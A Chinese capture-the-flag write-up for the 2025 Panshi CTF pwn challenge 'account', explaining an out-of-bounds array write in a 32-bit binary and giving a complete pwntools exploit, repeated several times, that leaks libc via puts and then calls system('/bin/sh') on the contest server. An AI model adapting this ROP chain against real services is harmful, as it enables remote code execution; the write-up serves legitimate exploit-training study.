# 磐石CTF2025 Pwn赛题account详解：32位环境下的数组越界与ROP实战

> 原文: https://www.ctfiot.com/265318.html
> ID: 265318

account

前言

关注公众号【Real返璞归真】，回复【磐石CTF2025】获取附件下载地址。

题目名：account

解题数：121

题目描述：无

知识点：数组越界访问、栈溢出、32位ROP

逆向分析

题目逻辑非常简单，只有一个vuln()函数：
image-20250807191623752

我们输入的数据被存储到v0变量中，这里把v0[0]也识别成后续数组的一部分了，我们对其修复，把v0类型改成非数组即可：
image-20250807191735782

漏洞分析

vuln()函数会循环读取我们的4字节输入，然后修改v1[v2++] = v0，从v1[0]逐渐向栈中高地址处增长，这里存在栈溢出漏洞。

如果增长的次数足够多，我们可以覆盖old_rbp、ret_addr等数据。思路非常简单，我们直接向返回地址处写入ROP即可。

需要注意一点：修改v1[10]即修改变量v2，它是数组当前循环的下标，我们需要写入一个合法的值，否则会出错。

先将v1数组写满，然后修改v2变量为13（下次循环会修改v1[14]位置，即存储返回地址的位置）：

for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

然后，写入第一次rop泄露libc地址：

# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))

然后，写入第二次rop直接ret2libc即可：

# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')

这里需要注意，32位程序中的地址均为4字节无符号整数，而程序使用scanf("%d", &v0)读入的是4字节有符号整数。

如果ROP中想写入的地址非常大，%d将无法读取，我们需要先将这个大数字转换为对应的负数，然后输入到程序中。

exp

from pwn import *

elf = ELF("./account")
libc = ELF("./libc-2.31.so")
# p = process([elf.path])
p = remote("pss.idss-cn.com", 22117)

context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'

for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))

# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')

p.interactive()


```
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)
# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))
# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')
from pwn import *

elf = ELF("./account")
libc = ELF("./libc-2.31.so")
# p = process([elf.path])
p = remote("pss.idss-cn.com", 22117)

context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'

for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# rop1
main = 0x8049264
pop_ebx_ret = 0x08049022

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

p.sendline(str(elf.plt['puts']).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(elf.got['puts']).encode())
sleep(0.2)
p.sendline(str(main).encode())
sleep(0.2)

p.sendline(b'0')

p.recvuntil(b'Recording completedn')
libc_base = u32(p.recvuntil(b'xf7')[-4:].ljust(4, b'x00')) - 0x6d1e0
libc.address = libc_base
success("libc_base = " + hex(libc_base))

# rop2
for i in range(10):
    p.sendline(b'57005') # 0x1234
    sleep(0.2)

# overwrite idx->13
p.sendline(b'13')
sleep(0.2)

# gdb.attach(p, 'b *0x80492C8nc')
# pause()

def to_signed(val):
    return val if val < 0x80000000else val - 0x100000000

p.sendline(str(to_signed(libc.sym['system'])).encode())
sleep(0.2)
p.sendline(str(pop_ebx_ret).encode())
sleep(0.2)
p.sendline(str(to_signed(next(libc.search(b'/bin/shx00')))).encode())
sleep(0.2)

p.sendline(b'0')

p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440396-wxsync-2025-08-4c2625c81203ceed67d13e2c63b21875.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/08/1755440397-wxsync-2025-08-89123429c08448007b39575ed2de263d.png)